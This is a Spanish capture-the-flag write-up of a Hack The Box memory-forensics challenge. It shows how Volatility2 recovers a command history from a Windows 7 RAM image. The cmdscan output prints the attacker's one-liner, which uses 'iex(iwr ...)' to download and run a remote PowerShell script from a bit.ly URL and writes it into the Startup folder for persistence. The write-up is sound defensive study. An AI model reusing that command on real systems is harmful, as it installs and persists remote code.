---
title: "Export"
description: "Writeup de Export - Hack The Box - Forensics 200pts. Imagen de memoria RAM de Windows 7 analizada con Volatility2; cmdscan revela un comando echo que escribe un PS1 al directorio Startup con una URL que contiene base64; decodificar la URL revela la flag."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - volatility
  - memory-forensics
  - windows
  - powershell
  - base64
  - startup-persistence
---

# Export

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

Se proporciona una imagen de memoria RAM de un sistema Windows 7 (`WIN-LQS146OE2S1-20201027-142607.raw`). Con Volatility2 se enumeran procesos y se analizan los buffers de comandos de las consolas. El plugin `cmdscan` revela que `cmd.exe` ejecutó un comando `echo` que escribe un archivo `.ps1` malicioso al directorio de Startup del usuario — garantizando persistencia en el próximo arranque. La URL en ese comando contiene el nombre de un archivo en base64 que, decodificado, revela la flag.

---

## Reconocimiento de la imagen

```bash
python2 vol.py -f WIN-LQS146OE2S1-20201027-142607.raw imageinfo
```

```
Suggested Profile(s) : Win7SP0x64, Win7SP1x64, Win7SP0x64NoPAE
AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
Image date and time : 2020-10-27 14:26:07
Image local date and time : 2020-10-27 10:26:07
PAE type : No PAE
```

Usamos el perfil `Win7SP1x64`.

---

## Enumeración de procesos

```bash
python2 vol.py -f WIN-LQS146OE2S1-20201027-142607.raw --profile=Win7SP1x64 pstree
```

```
Name                Pid     PPid
DumpIt.exe          2004    2324
 cmd.exe            1640    2004
  conhost.exe       1780    1640
```

`DumpIt.exe` (la herramienta que generó el dump) tiene un `cmd.exe` hijo con PID 1640. El `conhost.exe` PID 1780 gestiona la ventana de esa consola — y aquí es donde `cmdscan` encontrará los comandos históricos.

---

## Extracción de comandos con cmdscan

```bash
python2 vol.py -f WIN-LQS146OE2S1-20201027-142607.raw --profile=Win7SP1x64 cmdscan
```

```
**************************************************
CommandProcess: conhost.exe Pid: 1780
CommandHistory: 0x21e5c0 Application: cmd.exe Flags: Allocated, Reset
Cmd #0 @ 0x21daa0: echo iex(iwr "http%3A%2F%2Fbit.ly%2FSFRCe1cxTmQwd3NfZjByM05zMUNTXzNIP30%3D.ps1") > "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\3usy12fv.ps1"
```

El comando hace varias cosas en una sola línea:
1. Descarga un script PS1 desde una URL usando `iwr` (Invoke-WebRequest).
2. Ejecuta el script descargado con `iex` (Invoke-Expression).
3. Escribe ese one-liner en el directorio **Startup** del usuario como `3usy12fv.ps1`, garantizando ejecución en cada inicio de sesión.

La URL `http://bit.ly/SFRCe1cxTmQwd3NfZjByM05zMUNTXzNIP30=.ps1` contiene un string base64 codificado como URL en el path de bit.ly: `SFRCe1cxTmQwd3NfZjByM05zMUNTXzNIP30=`.

---

## Decodificación del base64 en la URL

```bash
# Primero decodificar URL encoding:
# SFRCe1cxTmQwd3NfZjByM05zMUNTXzNIP30= (%3D → =)

echo "SFRCe1cxTmQwd3NfZjByM05zMUNTXzNIP30=" | base64 -d
```

```text
HTB{FLAG}
```

El nombre del archivo PS1 en bit.ly era la flag codificada en base64.

---

## Cadena de Ataque

```text
1. Atacante gana ejecución inicial en el sistema Windows 7
       ↓
2. cmd.exe PID 1640 ejecuta el payload (visible en cmdscan de conhost PID 1780)
       ↓
3. iwr descarga PS1 desde bit.ly con base64 en la URL → iex lo ejecuta en memoria
       ↓
4. echo escribe el mismo one-liner a Startup → persistencia en próximo login
       ↓
5. SFRCe1cxTmQwd3NfZjByM05zMUNTXzNIP30= | base64 -d → HTB{FLAG}
```

---

## Notas de análisis: por qué cmdscan vs consoles

- **`cmdscan`**: escanea buffers de comandos de `conhost.exe` / `csrss.exe`. Encuentra historial de comandos incluso si la consola ya fue cerrada.
- **`consoles`**: muestra el output completo de la consola (entrada y salida de texto). Más verboso.
- **`cmdline`**: muestra los argumentos de línea de comandos de cada proceso — útil para ver cómo se lanzó un proceso, pero no el historial interactivo.

Para encontrar comandos tecleados interactivamente, `cmdscan` es el punto de partida más directo.

---

## Lecciones Aprendidas

- **Directorio Startup como persistencia**: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` es uno de los vectores de persistencia más clásicos en Windows. Revisar siempre en análisis de incidentes.
- **Bit.ly para ofuscación de C2**: los acortadores de URL son un método sencillo para ocultar el dominio real del C2 y evitar detección por URL estática en firewalls.
- **Base64 en nombres de archivo/URL**: datos sensibles pueden estar codificados en rutas de URL, nombres de archivo o subdominios. Revisar todos los strings alfanuméricos largos.
- **Volatility2 vs Volatility3**: Volatility2 requiere Python 2 pero tiene soporte más amplio de perfiles para Windows 7. `cmdscan` está disponible en ambas versiones.

---

## Referencias

- [Volatility Framework](https://github.com/volatilityfoundation/volatility)
- [HackTricks — Windows Memory Forensics](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis)
- [MITRE ATT&CK — Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
